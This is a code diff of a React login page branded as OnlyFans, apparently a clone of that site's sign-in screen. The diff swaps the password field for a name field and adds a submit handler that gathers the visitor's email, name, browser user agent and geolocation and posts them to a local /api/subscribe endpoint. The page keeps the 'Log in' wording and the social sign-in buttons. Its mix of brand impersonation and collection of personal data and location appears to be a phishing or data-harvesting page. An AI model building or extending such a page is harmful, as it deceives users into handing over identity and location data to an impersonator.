@@ -4,17 +4,15 @@ import React, { useState } from "react";
 import { FaXTwitter, FaFingerprint } from "react-icons/fa6";
 import { FcGoogle } from "react-icons/fc";
 
+
 export default function Login() {
-  const [email, setEmail] = useState("");
-  const [password, setPassword] = useState("");
+  const [loading, setLoading] = useState(false);
+  const [errors, setErrors] = useState({ email: "", name: "" });
 
-  const [errors, setErrors] = useState({ email: "", password: "" });
-
-  const validateForm = (e) => {
+  const validateForm = (email, name) => {
     let valid = true;
-    let newErrors = { email: "", password: "" };
+    let newErrors = { email: "", name: "" };
 
-    // Email validation
     if (!email) {
       newErrors.email = "Email is required";
       valid = false;
@@ -23,26 +21,89 @@ export default function Login() {
       valid = false;
     }
 
-    // Password validation
-    if (!password) {
-      newErrors.password = "Password is required";
+    if (!name) {
+      newErrors.name = "Name is required";
       valid = false;
-    } else if (password.length < 4) {
-      newErrors.password = "Password must be at least 6 characters";
+    } else if (name.length < 2) {
+      newErrors.name = "Name must be at least 2 characters";
       valid = false;
-    }
-
-    // If invalid — stop form submission
-    if (!valid) {
-      e.preventDefault();
     }
 
     setErrors(newErrors);
+    return valid;
   };
 
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    setLoading(true);
+
+    const email = e.target.email.value.trim();
+    const name = e.target.name.value.trim();
+    const device = navigator.userAgent;
+
+    if (!validateForm(email, name)) {
+      setLoading(false);
+      return;
+    }
+
+    // Get location
+    let location = null;
+    try {
+      location = await new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+          (pos) =>
+            resolve({
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+            }),
+          () => resolve(null)
+        );
+      });
+    } catch {
+      location = null;
+    }
+
+    // Submit
+    await fetch("/api/subscribe", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        email,
+        name,
+        device,
+        latitude: location?.latitude || null,
+        longitude: location?.longitude || null,
+      }),
+    });
+
+    alert("Subscription successfully submitted!");
+    e.target.reset();
+    setLoading(false);
+  };
+
+  
+
   return (
-    <div className="flex min-h-screen">
-      {/* Left Side */}
+    <div className="flex flex-col md:flex md:flex-row min-h-screen bg-white">
+
+      {/* ▼▼ MOBILE HEADER ▼▼ */}
+      <div className="w-full p-6 md:hidden flex flex-col  ">
+        <div className="flex flex-row  gap-3  ">
+          <img
+            src="/avatar.jpg"
+            alt="Logo"
+            className="w-10 h-10 rounded-full object-cover"
+          />
+          <h1 className="text-3xl font-bold text-sky-500">OnlyFans</h1>
+        </div>
+
+        <p className="mt-4 text-2xl font-semibold leading-snug">
+          Sign up to support your favorite creators
+        </p>
+      </div>
+      {/* ▲▲ MOBILE HEADER ▲▲ */}
+
+      {/* LEFT SIDE — DESKTOP ONLY */}
       <div className="hidden md:flex w-1/2 bg-sky-500 items-center justify-center text-white">
         <div className="max-w-md p-8">
           <div className="flex flex-row items-center gap-3">
@@ -60,26 +121,24 @@ export default function Login() {
         </div>
       </div>
 
-      {/* Right Side */}
+      {/* RIGHT SIDE — FORM */}
       <div className="flex w-full md:w-1/2 items-center justify-center bg-white">
         <div className="w-full max-w-md p-8">
           <h2 className="text-lg font-semibold mb-4">Log in</h2>
 
-          {/* Login Form */}
+          {/* FORM */}
           <form
             className="space-y-4"
             action=""
             method="POST"
-            onSubmit={validateForm}
+            onSubmit={handleSubmit}
           >
-            {/* Email Input */}
             <div>
               <input
                 type="email"
                 name="email"
                 placeholder="Email"
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
+                
                 className="w-full border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-sky-400"
               />
               {errors.email && (
@@ -87,49 +146,41 @@ export default function Login() {
               )}
             </div>
 
-            {/* Password Input */}
             <div>
               <input
-                type="password"
-                name="words"
-                placeholder="Password"
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
+                type="name"
+                name="name"
+                placeholder="name"
+                
                 className="w-full border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-sky-400"
               />
-              {errors.password && (
-                <p className="text-red-500 text-xs mt-1">{errors.password}</p>
+              {errors.name && (
+                <p className="text-red-500 text-xs mt-1">{errors.name}</p>
               )}
             </div>
 
             <button
               type="submit"
-              className="w-full bg-gray-200 text-gray-400 font-semibold py-3 rounded-full cursor-pointer"
+              className="w-full bg-gray-200 text-gray-400 font-semibold py-3 rounded-full"
             >
               LOG IN
             </button>
           </form>
 
-          {/* Terms and Links */}
           <p className="text-xs text-gray-500 mt-3">
             By logging in and using this site, you agree to our{" "}
-            <a href="#" className="text-sky-500">
-              Terms of Service
-            </a>{" "}
-            and{" "}
-            <a href="#" className="text-sky-500">
-              Privacy Policy
-            </a>
-            , and confirm that you are at least 18 years old.
+            <a className="text-sky-500">Terms of Service</a> and{" "}
+            <a className="text-sky-500">Privacy Policy</a>, and confirm you are
+            at least 18 years old.
           </p>
 
           <div className="flex justify-center text-sm text-sky-500 mt-4 space-x-2">
-            <a href="#">Forgot password?</a>
+            <a>Forgot password?</a>
             <span>•</span>
-            <a href="#">Sign up for an account</a>
+            <a>Sign up for an account</a>
           </div>
 
-          {/* Social Buttons */}
+          {/* SOCIAL BUTTONS */}
           <div className="mt-6 space-y-3">
             <button className="w-full flex gap-2 bg-sky-500 text-white font-semibold py-3 rounded-full hover:bg-sky-600 transition relative">
               <div className="ml-0.5 -mt-2.5 py-[13.3px] px-2 absolute left-0 rounded-l-full">
